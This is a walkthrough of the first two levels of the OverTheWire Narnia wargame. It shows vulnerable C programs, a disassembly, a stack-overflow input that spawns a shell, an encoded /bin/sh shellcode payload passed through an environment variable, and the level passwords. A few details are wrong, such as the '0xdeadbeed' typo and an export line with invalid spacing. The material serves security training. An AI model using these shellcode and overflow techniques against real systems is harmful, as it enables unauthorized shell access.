
# OverTheWire

OverTheWire's challenges walkthrogh.

Table of contents:
1. [Narnia](#Narnia)

## Narnia
### level 0->1
We can connect using secure 
shell to the server with narnia0 as the 
user and narnia0 as the password. After we logged 
in we can see two files narnia0 and narnia0.c .

*narnia0.c*
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    return 0;
}
```
From the code we can see that there is buffer
that gets from the standard input 24 bytes while
the buffer is only contains 20 bytes of space. before
that buffer we can see that the program declered variable
that contains 4 bytes so on the stack we can overwrite
this variable by send to the standard input 24 bytes.
Important thing we need to notice is that the scanf
function takes string and we need to change 0x41414141 to 0xdeadbeed
so we need to provide the standard input the string
presentation of 0xdeadbeef in hex. 

We can do it by write in the bash:
```
echo -e '\xef\xbe\xad\xde'
```
So the exploit will be:
```
(echo -e 'AAAABBBBCCCCEEEEFFFF\xef\xbe\xad\xde'; cat;) | ./narnia0
```
The password for the next level is: eaa6AjYMBB

### level 1->2

*narnia1.c*
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
If we take a look at the source code we can see that first we check if the env var called "EGG" is exist on the machine if it is not we print something, if it is we can see that we take the string that the "EGG" env contains, put it in ret pointer and trying to execute it.

Lets look at the assembly for a sec to understand how it executes the string that EGG contains.
```asm
Dump of assembler code for function main:
   0x08049196 <+0>:     push   %ebp
   0x08049197 <+1>:     mov    %esp,%ebp
   0x08049199 <+3>:     sub    $0x4,%esp
   0x0804919c <+6>:     push   $0x804a008
   0x080491a1 <+11>:    call   0x8049050 <getenv@plt>
   0x080491a6 <+16>:    add    $0x4,%esp
   0x080491a9 <+19>:    test   %eax,%eax
   0x080491ab <+21>:    jne    0x80491c1 <main+43>
   0x080491ad <+23>:    push   $0x804a00c
   0x080491b2 <+28>:    call   0x8049060 <puts@plt>
   0x080491b7 <+33>:    add    $0x4,%esp
   0x080491ba <+36>:    push   $0x1
   0x080491bc <+38>:    call   0x8049070 <exit@plt>
   0x080491c1 <+43>:    push   $0x804a041
   0x080491c6 <+48>:    call   0x8049060 <puts@plt>
   0x080491cb <+53>:    add    $0x4,%esp
   0x080491ce <+56>:    push   $0x804a008
   0x080491d3 <+61>:    call   0x8049050 <getenv@plt>
   0x080491d8 <+66>:    add    $0x4,%esp
   0x080491db <+69>:    mov    %eax,-0x4(%ebp)
   0x080491de <+72>:    mov    -0x4(%ebp),%eax
   0x080491e1 <+75>:    call   *%eax
   0x080491e3 <+77>:    mov    $0x0,%eax
   0x080491e8 <+82>:    leave  
   0x080491e9 <+83>:    ret    
End of assembler dump.
```
The intresting lines are 61-77 we can clearly see that it calls getenv(), after that it makes space on the stack and finally calls the function that eax points to(getenv() returns a pointer to a string).
So all we need to to is to put in EGG a shellcode that execute "/bin/sh".
after I have tried couple of shellcodes shellcodes this one worked: "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"

The final exploit will be:
```
export EGG = $(echo -e "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")
```
```
./narnia1
```
The password for the next level is: Zzb6MIyceT










